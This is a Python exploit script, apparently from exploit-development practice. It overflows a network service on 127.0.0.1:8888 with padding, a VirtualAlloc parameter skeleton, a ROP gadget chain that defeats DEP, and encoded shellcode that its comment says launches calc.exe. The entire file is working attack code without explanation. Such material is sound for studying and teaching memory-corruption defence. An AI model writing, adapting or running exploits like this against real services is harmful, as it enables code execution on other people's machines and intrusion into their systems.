import socket
from struct import pack


va = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize
va += pack("<L", (0x49494949)) # # dummy flAllocationType
va += pack("<L", (0x51515151)) # dummy flProtect

### Reference for VirtualAlloc 
# LPVOID VirtualAlloc(
# [in, optional] LPVOID lpAddress,
# [in]           SIZE_T dwSize,
# [in]           DWORD  flAllocationType,
# [in]           DWORD  flProtect
# );

rop_gadgets = [
    ### Storing a value pointing to dummy virtualalloc so we can use it later on
    0x6fe52d40, # push esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret ;
    0x42424242, # stack alignment
    0x43434343, # stack alignment
    0x44444444, # stack alignment
    0x6d9e4f16, # mov eax, ebx ; pop ebx ; ret ;
    0x43434343, # stack alignment
    0x6fe412c9, # pop ebp ; ret ;
    0xffffffe0, # -20 to reach virtualalloc skeleton
    0x61ba8137, # add eax, ebp ; ret
    0x68be726b, # xchg eax, ecx ; ret

    ### Updating 45454545 with actual virtual alloc address
    0x61b6122a, # pop eax ; ret;
    0x690398A0, # IAT address of VirtualAlloc 
    0x699030c5, # mov eax, [eax] ; ret
    0x6d9cb59c, # mov [ecx], eax ; ret ;

    ### setting address of the shellcode for return value for VirtualAlloc
    ### first dummy value is set as a size and replaced afterwards once ROP chain is complete
    0x6ab445f9, # mov eax, ecx
    0x6fe412c9, # pop ebp ; ret
    0xfffffef4, # shellcode address
    0x61f7d4c7, # sub eax, ebp ; pop ebp ; retn 0x0004 ;
    0x43434343, # stack alignment
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6d9cb59c, # mov [ecx], eax ; ret ;

    ### setting address of the shellcode for 1 parameter of VirtualAlloc
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ; 
    0x6fef427b, # inc ecx ; ret ;
    0x6d9cb59c, # mov  [ecx], eax ; ret ;

    ### setting 1 for 2nd parameter of VirtualAlloc
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ; 
    0x6fef427b, # inc ecx ; ret ;
    0x6aa85060, # xor eax, eax ; ret ;
    0x6fe72551, # inc eax ; ret ;
    0x6d9cb59c, # mov  [ecx], eax ; ret ;

    ### setting 1000 for 3th parameter of VirtualAlloc
    0x61b6122a, # pop eax ; ret;
    0xffffefff, # -1001
    0x6fe4ceaa, # neg eax ; ret ; 
    0x68a84305, # dec eax ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6d9cb59c, # mov  [ecx], eax ; ret ;

    ### setting 40 for 4th parameter of VirtualAlloc
    0x61b6122a, # pop eax ; ret;
    0xffffffc0, # 40
    0x6fe4ceaa, # neg eax ; ret ; 
    0x68a84305, # dec eax ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6fef427b, # inc ecx ; ret ;
    0x6d9cb59c, # mov  [ecx], eax ; ret ;

    ### Redirect flow to VirtuaAlloc
    0x6ab445f9, # mov eax, ecx ; ret ; Moving ecx to eax which points to last parameter of VirtualAlloc
    0x6fe412c9, # pop ebp ; ret ; Getting current esp to ebp
    0xffffffec, # This points the VirtualAlloc
    0x61ba8137, # add eax, ebp ; ret
    0x68a91b9c, # xchg eax, esp ; ret ; Exchange esp with value pointing to VirtualAlloc to redirect the flow
]

ropchain = b""
for rop in rop_gadgets:
    ropchain += pack('<L', rop)

target = "127.0.0.1"
junk = b"A" * (1052 - len(va))

# Shellcode calc.exe
shellcode =  b""
shellcode += b"\xba\xe1\xd0\xbd\x39\xd9\xf7\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e"
shellcode += b"\x03\xb1\xde\x5f\xcc\xcd\x37\x1d\x2f\x2d\xc8"
shellcode += b"\x42\xb9\xc8\xf9\x42\xdd\x99\xaa\x72\x95\xcf"
shellcode += b"\x46\xf8\xfb\xfb\xdd\x8c\xd3\x0c\x55\x3a\x02"
shellcode += b"\x23\x66\x17\x76\x22\xe4\x6a\xab\x84\xd5\xa4"
shellcode += b"\xbe\xc5\x12\xd8\x33\x97\xcb\x96\xe6\x07\x7f"
shellcode += b"\xe2\x3a\xac\x33\xe2\x3a\x51\x83\x05\x6a\xc4"
shellcode += b"\x9f\x5f\xac\xe7\x4c\xd4\xe5\xff\x91\xd1\xbc"
shellcode += b"\x74\x61\xad\x3e\x5c\xbb\x4e\xec\xa1\x73\xbd"
shellcode += b"\xec\xe6\xb4\x5e\x9b\x1e\xc7\xe3\x9c\xe5\xb5"
shellcode += b"\x3f\x28\xfd\x1e\xcb\x8a\xd9\x9f\x18\x4c\xaa"
shellcode += b"\xac\xd5\x1a\xf4\xb0\xe8\xcf\x8f\xcd\x61\xee"
shellcode += b"\x5f\x44\x31\xd5\x7b\x0c\xe1\x74\xda\xe8\x44"
shellcode += b"\x88\x3c\x53\x38\x2c\x37\x7e\x2d\x5d\x1a\x17"
shellcode += b"\x82\x6c\xa4\xe7\x8c\xe7\xd7\xd5\x13\x5c\x7f"
shellcode += b"\x56\xdb\x7a\x78\x99\xf6\x3b\x16\x64\xf9\x3b"
shellcode += b"\x3f\xa3\xad\x6b\x57\x02\xce\xe7\xa7\xab\x1b"
shellcode += b"\xa7\xf7\x03\xf4\x08\xa7\xe3\xa4\xe0\xad\xeb"
shellcode += b"\x9b\x11\xce\x21\xb4\xb8\x35\xa2\x7b\x94\x51"
shellcode += b"\x36\x14\xe7\x99\x37\x5f\x6e\x7f\x5d\x8f\x27"
shellcode += b"\x28\xca\x36\x62\xa2\x6b\xb6\xb8\xcf\xac\x3c"
shellcode += b"\x4f\x30\x62\xb5\x3a\x22\x13\x35\x71\x18\xb2"
shellcode += b"\x4a\xaf\x34\x58\xd8\x34\xc4\x17\xc1\xe2\x93"
shellcode += b"\x70\x37\xfb\x71\x6d\x6e\x55\x67\x6c\xf6\x9e"
shellcode += b"\x23\xab\xcb\x21\xaa\x3e\x77\x06\xbc\x86\x78"
shellcode += b"\x02\xe8\x56\x2f\xdc\x46\x11\x99\xae\x30\xcb"
shellcode += b"\x76\x79\xd4\x8a\xb4\xba\xa2\x92\x90\x4c\x4a"
shellcode += b"\x22\x4d\x09\x75\x8b\x19\x9d\x0e\xf1\xb9\x62"
shellcode += b"\xc5\xb1\xca\x28\x47\x93\x42\xf5\x12\xa1\x0e"
shellcode += b"\x06\xc9\xe6\x36\x85\xfb\x96\xcc\x95\x8e\x93"
shellcode += b"\x89\x11\x63\xee\x82\xf7\x83\x5d\xa2\xdd"

payload = junk + va + ropchain + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8888))
    s.send(payload)
except:
    print("Crashed!")
